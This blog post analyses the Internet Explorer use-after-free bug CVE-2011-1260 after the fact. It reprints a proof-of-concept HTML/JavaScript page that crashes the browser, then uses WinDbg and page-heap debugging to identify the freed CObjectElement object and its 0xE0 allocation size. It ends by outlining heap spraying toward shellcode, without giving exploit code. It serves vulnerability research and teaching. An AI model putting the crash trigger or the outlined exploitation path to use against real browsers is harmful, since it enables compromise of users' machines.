---
title: "Post-mortem Analysis of a Use-After-Free Vulnerability CVE-2011-1260"
date: 2011-07-07T13:00:00.006-04:00
draft: false
type: posts
summary: "Recently, I've been looking into the exploitation of use-after-free vulnerabilities. This class of bug is very application specific, but armed with just the right amount of knowledge these vulnerabilities can be exploited to bypass most modern OS exploit mitigations. After reading Nephi Johnson's (@d0c_s4vage) excellent article[1] on exploiting an IE"
categories: 
- use-after-free,reverse engineering
---
# Post-mortem Analysis of a Use-After-Free Vulnerability CVE-2011-1260


<br/>
Recently, I've been looking into the exploitation of use-after-free vulnerabilities. This class of bug is very application specific, but armed with just the right amount of knowledge these vulnerabilities can be exploited to bypass most modern OS exploit mitigations. After reading Nephi Johnson's (@d0c\_s4vage) excellent article\[[1](#3_1)\] on exploiting an IE use-after-free vulnerability, I decided to ride his coattails and show the steps I used to analyze his proof-of-concept crash code.  
  
As shown in his blog post, here is Nephi's test case that crashes IE:  

<html><br />    <body><br />        <script language='javascript'><br />            document.body.innerHTML += "<object align='right' hspace='1000'   width='1000'>TAG\_1</object>";<br />            document.body.innerHTML += "<a id='tag\_3' style='bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px' >TAG\_3</a>";<br />            document.body.innerHTML += "AAAAAAA";<br />            document.body.innerHTML += "<strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='ltr'>TAG\_11</strong>";<br />        </script><br />    </body><br /></html>

Internet Explorer crashes at mshtml!CElement::Doc+0x2  
  

76c.640): Access violation - code c0000005 (first chance)

First chance exceptions are reported before any exception handling.

This exception may be expected and handled.

eax=00000000 ebx=004aedc0 ecx=004e00e9 edx=00000000 esi=0209e138 edi=00000000

eip=6d55c402 esp=0209e10c ebp=0209e124 iopl=0         nv up ei pl zr na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246

mshtml!CElement::Doc+0x2:

6d55c402 8b5070          mov     edx,dword ptr \[eax+70h\] ds:0023:00000070=????????

  
Here is the order of execution leading to the crash:  
  

mshtml!CTreeNode::ComputeFormats+0x42

6d58595a 8b0b            mov     ecx,dword ptr \[ebx\]

6d58595c e89f6afdff      call    mshtml!CElement::Doc (6d55c400)

mshtml!CElement::Doc:

6d55c400 8b01            mov     eax,dword ptr \[ecx\]

6d55c402 8b5070          mov     edx,dword ptr \[eax+70h\] ds:0023:00000070=????????

6d55c405 ffd2            call    edx

  
This is a classic C++ use-after-free vulnerability. IE is trying to call a function within a previously freed object's virtual function table. In the disassembly above, a pointer to some object \[EBX\] has a pointer to its virtual function table \[ECX\] that subsequently calls a function at offset 0x70 in its vftable \[EAX+0x70\].  
  
What we need to find out is what type of object was freed and how many bytes get allocated for that object. That way, we can craft fake objects of that size (using javascript) whose vftable at offset 0x70 point to our shellcode.  
  
Since mshtml!CTreeNode::ComputeFormats+0x42 points to the object in question (in EBX), I set a breakpoint in Windbg on that instruction and got the following:  

BP mshtml!CTreeNode::ComputeFormats+0x42 10 ".printf \\"Object Pointer:\\\\t%08x\\\\nVFTable Pointer:\\\\t%08x\\\\nVFTable:\\\\t\\\\t%08x\\\\nObject Type:\\\\n\\", ebx, poi(ebx), poi(poi(ebx)); ln poi(poi(ebx)); g"<br /><br />0:013> g<br />Object Pointer:    00608808<br />VFTable Pointer:    00611890<br />VFTable:        6caf1e40<br />Object Type:<br />(6caf1e40)   mshtml!CObjectElement::\`vftable'   |  (6cbf9270)   mshtml!CDummyUnknown::\`vftable'<br />Exact matches:<br />    mshtml!CObjectElement::\`vftable' = <no type information><br />Object Pointer:    005c55e8<br />VFTable Pointer:    005b4338<br />VFTable:        6cb96670<br />Object Type:<br />(6cb96670)   mshtml!CBodyElement::\`vftable'   |  (6cbf9108)   mshtml!CCaret::\`vftable'<br />Exact matches:<br />    mshtml!CBodyElement::\`vftable' = <no type information><br />Object Pointer:    00608808<br />VFTable Pointer:    00611890<br />VFTable:        6caf1e40<br />Object Type:<br />(6caf1e40)   mshtml!CObjectElement::\`vftable'   |  (6cbf9270)   mshtml!CDummyUnknown::\`vftable'<br />Exact matches:<br />    mshtml!CObjectElement::\`vftable' = <no type information><br />Object Pointer:    00608a18<br />VFTable Pointer:    005c2ac8<br />VFTable:        6ca47dd8<br />Object Type:<br />(6ca47dd8)   mshtml!CAnchorElement::\`vftable'   |  (6ca48020)   mshtml!CFontElement::\`vftable'<br />Exact matches:<br />    mshtml!CAnchorElement::\`vftable' = <no type information><br />Object Pointer:    00608ac8<br />VFTable Pointer:    005d6f68<br />VFTable:        6ca470e0<br />Object Type:<br />(6ca470e0)   mshtml!CPhraseElement::\`vftable'   |  (6ca47308)   mshtml!CBlockElement::\`vftable'<br />Exact matches:<br />    mshtml!CPhraseElement::\`vftable' = <no type information><br />Object Pointer:    00608808<br />VFTable Pointer:    00610023<br />VFTable:        00000000<br />Object Type:<br />(274.418): Access violation - code c0000005 (first chance)<br />First chance exceptions are reported before any exception handling.<br />This exception may be expected and handled.<br />eax=00000000 ebx=00608808 ecx=00610023 edx=00000000 esi=0207e0b8 edi=00000000<br />eip=6cbfc402 esp=0207e08c ebp=0207e0a4 iopl=0         nv up ei pl zr na pe nc<br />cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246<br />mshtml!CElement::Doc+0x2:<br />6cbfc402 8b5070          mov     edx,dword ptr \[eax+70h\] ds:0023:00000070=????????

As can be seen above, EBX points to a freed CObjectElement object. How can we know for sure that the object was freed and that it points to a CObjectElement object? Enabling the page heap and user stack traces of every call to malloc and free will do the trick. This technique also allows us to observe the size allocated to CObjectElement.  

gflags /i iexplore.exe +hpa +ust<br /><br />C:\\Users\\Temp\\Desktop>gflags /i iexplore.exe +hpa +ust<br />Current Registry Settings for iexplore.exe executable are: 02001000<br />    ust - Create user mode stack trace database<br />    hpa - Enable page heap<br /><br />BP mshtml!CTreeNode::ComputeFormats+0x42 12 "!heap -p -a poi(ebx); g"<br /><br />...<br />    address 070ccf20 found in<br />    \_DPH\_HEAP\_ROOT @ 151000<br />    in busy allocation (  DPH\_HEAP\_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)<br />                                 6ec31d4:          70ccf20               e0 -          70cc000             2000<br />          mshtml!CObjectElement::\`vftable'<br />    6ed98e89 verifier!AVrfDebugPageHeapAllocate+0x00000229<br />    771e5c4e ntdll!RtlDebugAllocateHeap+0x00000030<br />    771a7e5e ntdll!RtlpAllocateHeap+0x000000c4<br />    771734df ntdll!RtlAllocateHeap+0x0000023a<br />    6bec1da3 mshtml!CObjectElement::CreateElement+0x00000018<br />    6bf54be9 mshtml!CreateElement+0x00000043<br />    6bf58961 mshtml!CHtmParse::ParseBeginTag+0x000000e3<br />    6bf56e93 mshtml!CHtmParse::ParseToken+0x00000082<br />    6bf575c9 mshtml!CHtmPost::ProcessTokens+0x00000237<br />    6bf478e8 mshtml!CHtmPost::Exec+0x00000221<br />    6bf178ae mshtml!CHtmLoad::Init+0x0000033c<br />    6bfdc444 mshtml!CDwnInfo::SetLoad+0x0000011b<br />    6bfdc348 mshtml!CDwnCtx::SetLoad+0x0000007a<br />    6bfdda01 mshtml!CHtmCtx::SetLoad+0x00000013<br />    6bf5be5f mshtml!CMarkup::Load+0x00000167<br />    6bf1746e mshtml!CMarkup::Load+0x000000ee<br />    6bf181c3 mshtml!CDoc::ParseHtmlStream+0x000000ce<br />    6bf17a5b mshtml!InjectHtmlStream+0x000000fd<br />    6bf1793e mshtml!HandleHTMLInjection+0x0000005c<br />    6bf171fa mshtml!CElement::InjectInternal+0x00000307<br />    6bf1704a mshtml!CElement::InjectCompatBSTR+0x00000046<br />    6bf1988c mshtml!CElement::put\_innerHTML+0x00000040<br />    6c0572d6 mshtml!GS\_BSTR+0x000001ac<br />    6c04235c mshtml!CBase::ContextInvokeEx+0x000005dc<br />    6c04c75a mshtml!CElement::ContextInvokeEx+0x0000009d<br />    6c04c79a mshtml!CInput::VersionedInvokeEx+0x0000002d<br />    6bff3104 mshtml!PlainInvokeEx+0x000000eb<br />    6d2fa1bc jscript!IDispatchExInvokeEx2+0x00000104<br />    6d2fa107 jscript!IDispatchExInvokeEx+0x0000006a<br />    6d2fa388 jscript!InvokeDispatchEx+0x00000098<br />    6d2fa432 jscript!VAR::InvokeByName+0x00000139<br />    6d30d8e8 jscript!VAR::InvokeDispName+0x0000007d<br />...<br /><br /># At time of crash, \[EBX\] points to freed memory:<br /><br />(3cc.748): Access violation - code c0000005 (first chance)<br />First chance exceptions are reported before any exception handling.<br />This exception may be expected and handled.<br />eax=6ce35100 ebx=073cefb0 ecx=07c06f20 edx=00000000 esi=043dde18 edi=00000000<br />eip=6cabc400 esp=043dddec ebp=043dde04 iopl=0         nv up ei pl zr na pe nc<br />cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246<br />mshtml!CElement::Doc:<br />6cabc400 8b01            mov     eax,dword ptr \[ecx\]  ds:0023:07c06f20=????????<br />0:005> !heap -p -a poi(ebx)<br />    address 07c06f20 found in<br />    \_DPH\_HEAP\_ROOT @ 161000<br />    in free-ed allocation (  DPH\_HEAP\_BLOCK:         VirtAddr         VirtSize)<br />                                    7af2820:          7c06000             2000<br />    6dec90b2 verifier!AVrfDebugPageHeapFree+0x000000c2<br />    77ab641c ntdll!RtlDebugFreeHeap+0x0000002f<br />    77a77b92 ntdll!RtlpFreeHeap+0x0000005d<br />    77a42d80 ntdll!RtlFreeHeap+0x00000142<br />    7762f1cc kernel32!HeapFree+0x00000014<br />    6cb0ebb9 mshtml!CLineServices::DisposePtr+0x00000016<br />    70905306 msls31!DestroyILSObjText+0x000001cd<br />    7090512b msls31!LsDestroyContext+0x00000091<br />    6cb0f171 mshtml!DeinitLineServices+0x00000015<br />    6cb1355f mshtml!CLSCache::ReleaseEntry+0x0000003e<br />    6cadd1d4 mshtml!CLSMeasurer::Deinit+0x00000036<br />    6cb1b304 mshtml!CDisplay::UpdateView+0x00000208<br />    6cb18c5c mshtml!CFlowLayout::CommitChanges+0x0000009c<br />    6cb18b5c mshtml!CDisplay::WaitForRecalc+0x00000131<br />    6ca91a45 mshtml!CFlowLayout::LineStart+0x00000025<br />    6ca96625 mshtml!CDisplayPointer::GetLineStart+0x0000008b<br />    6ca96571 mshtml!CDisplayPointer::IsAtBOL+0x0000004e<br />    6ca90407 mshtml!CCaretTracker::PositionCaretAt+0x00000128<br />    6ca90294 mshtml!CCaretTracker::Init2+0x00000053<br />    6ca8e8b4 mshtml!CSelectionManager::SetCurrentTracker+0x00000026<br />    6ca8feb5 mshtml!CSelectionManager::CreateTrackerForContext+0x00000335<br />    6ca8fb99 mshtml!CSelectionManager::SetEditContext+0x0000008d<br />    6ca8fadd mshtml!CSelectionManager::SetEditContextFromElement+0x0000032d<br />    6ca95223 mshtml!CSelectionManager::SetInitialEditContext+0x00000064<br />    6ca95115 mshtml!CSelectionManager::Initialize+0x000001c6<br />    6ca9558f mshtml!CHTMLEditor::Initialize+0x00000168<br />    6ca33065 mshtml!CDoc::GetHTMLEditor+0x00000058<br />    6ca90d6c mshtml!CDoc::CreateServiceW+0x0000038c<br />    6cacbc6b mshtml!CDoc::QueryService+0x00000166<br />    7301ff58 IEFRAME!CSelectionServicesListenerBase::\_GetHTMLEditServices+0x00000044<br />    7301fe9c IEFRAME!CSelectionServicesListenerBase::\_GetSelectionServices2+0x00000036<br />    7301fe3a IEFRAME!CSelectionServicesListenerBase::\_InstallSelectionServicesListener+0x0000001c

The size that gets allocated to the CObjectElement object is 0xE0. It is also handy to see the call stacks of what allocated and freed the object. The size allocated for the object was determined via dynamic analysis. There's more than one way to skin a cat though. The same information can be gleaned via static analysis. A brief glance of the mshtml!CObjectElement::CreateElement function (which was called in the call stack above) in IDA shows that 0xE0 bytes is allocated for CObjectElement.  
  

[![](http://1.bp.blogspot.com/-6ZVgXbq6wic/ThXiApf4TwI/AAAAAAAAABY/W3ufwkKj0zY/s400/CObjectElement_Allocation.jpg)](http://1.bp.blogspot.com/-6ZVgXbq6wic/ThXiApf4TwI/AAAAAAAAABY/W3ufwkKj0zY/s1600/CObjectElement_Allocation.jpg)

  
According to the disassembly (for CObjectElement::CObjectElement), the actual size of the class is 0xDC. However, 0xE0 is allocated on the heap because the compiler rounded up the size to the nearest DWORD boundary.  
  

[![](http://3.bp.blogspot.com/-7sNWY36DtDE/ThXiggyxhNI/AAAAAAAAABc/D8TvuLs43TQ/s400/CObjectElement_Constructor.jpg)](http://3.bp.blogspot.com/-7sNWY36DtDE/ThXiggyxhNI/AAAAAAAAABc/D8TvuLs43TQ/s1600/CObjectElement_Constructor.jpg)

  
Lastly, although it is not always necessary for exploitation, let's determine the actual function that should have been called at the time of the crash. This can be accomplished several ways in Windbg.  

0:005> ln poi(mshtml!CObjectElement::\`vftable'+0x70)<br />(6d6bc3d0)   mshtml!CElement::SecurityContext   |  (6d6bc400)   mshtml!CElement::Doc<br />Exact matches:<br />    mshtml!CElement::SecurityContext = <no type information><br /><br />or:<br /><br />0:005> ? mshtml!CObjectElement::\`vftable'+0x70<br />Evaluate expression: 1834688176 = 6d5b1eb0<br />0:005> dds mshtml!CObjectElement::\`vftable'<br />6d5b1e40  6d5b17fa mshtml!CObjectElement::PrivateQueryInterface<br />6d5b1e44  6d6bc443 mshtml!CElement::PrivateAddRef<br />6d5b1e48  6d6bc466 mshtml!CElement::PrivateRelease<br />6d5b1e4c  6d62ce9b mshtml!CObjectElement::\`vector deleting destructor'<br />6d5b1e50  6d644ad5 mshtml!CSite::Init<br />6d5b1e54  6d62cc29 mshtml!CObjectElement::Passivate<br />6d5b1e58  6d6bbd95 mshtml!CBase::IsRootObject<br />6d5b1e5c  6d7585a6 mshtml!CBase::EnumerateTrackedReferences<br />6d5b1e60  6d81fe3a mshtml!CBase::SetTrackedState<br />6d5b1e64  6d605743 mshtml!CElement::GetInlineStylePtr<br />6d5b1e68  6d6e6a10 mshtml!CElement::GetRuntimeStylePtr<br />6d5b1e6c  6d8b91cf mshtml!CBase::VersionedGetIDsOfNames<br />6d5b1e70  6d845847 mshtml!CElement::VersionedInvoke<br />6d5b1e74  6d5b2e75 mshtml!COleSite::VersionedGetDispID<br />6d5b1e78  6d5b2b83 mshtml!CObjectElement::VersionedInvokeEx<br />6d5b1e7c  6d764d4e mshtml!CBase::VersionedDeleteMemberByName<br />6d5b1e80  6d877b83 mshtml!CBase::VersionedDeleteMemberByDispID<br />6d5b1e84  6d73c532 mshtml!COmWindowProxy::VersionedGetDispID<br />6d5b1e88  6d52092c mshtml!CBase::VersionedGetMemberName<br />6d5b1e8c  6d73c532 mshtml!COmWindowProxy::VersionedGetDispID<br />6d5b1e90  6d8b921e mshtml!CBase::VersionedGetNameSpaceParent<br />6d5b1e94  6d877ecb mshtml!CBase::GetEnabled<br />6d5b1e98  6d877ecb mshtml!CBase::GetEnabled<br />6d5b1e9c  6d9448dd mshtml!COleSite::GetPages<br />6d5b1ea0  6d94488f mshtml!COleSite::InterfaceSupportsErrorInfo<br />6d5b1ea4  6d943cbb mshtml!CObjectElement::QueryStatus<br />6d5b1ea8  6d943d3b mshtml!CObjectElement::Exec<br />6d5b1eac  6d6c7770 mshtml!CHtmBodyParseCtx::GetHpxEmbed<br />6d5b1eb0  6d6bc3d0 mshtml!CElement::SecurityContext<br />6d5b1eb4  6d6e302d mshtml!CBase::SecurityContextAllowsAccess<br />6d5b1eb8  6d828617 mshtml!CElement::DesignMode<br />6d5b1ebc  6d5fe445 mshtml!CElement::SupportedCSSLevel

The function that should have been called was mshtml!CElement::SecurityContext.  
  
So to refresh our memories, what was needed to begin exploiting a use-after-free bug?  
  
1) The type of object referenced after being freed  
2) The size allocated to the object  
  
There is no magic command that will give you this information and as usual, there is always more than one way to obtain this information. The key is to understand what lead to the crash. The next step is to utilize javascript to declare string variables that will allocate fake objects in the heap that point to attacker controlled shellcode (via heap spraying). This can be accomplished reliably without needing to point to a typical address like 0x0C0C0C0C which serves as both an address in the heap and a NOP slide. More on that in a future blog post...  
  
References:  
  
1\. N. Johnson, "Insecticides don't kill bugs, Patch Tuesdays do,"  
June 16, 2011, http://d0cs4vage.blogspot.com/2011/06/insecticides-dont-kill-bugs-patch.html

![](https://blogger.googleusercontent.com/tracker/6052198192158185644-5403222886475465556?l=exploit-monday.com)

<br/>
---
